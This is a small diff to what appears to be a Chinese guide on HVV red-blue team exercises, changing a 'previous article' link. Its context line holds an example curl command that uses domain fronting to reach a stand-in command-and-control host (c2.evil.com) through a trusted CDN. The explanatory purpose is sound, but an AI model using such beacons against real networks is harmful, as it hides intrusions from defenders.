@@ -220,4 +220,4 @@ curl -H "Host: c2.evil.com" https://cdn.trusted-site.com/beacon
 
 ---
 
-*上一篇：[HVV 实战概述](01-hvv-overview.md)*
+*上一篇：[HVV 实战概述](01-red-blue-team.md)*
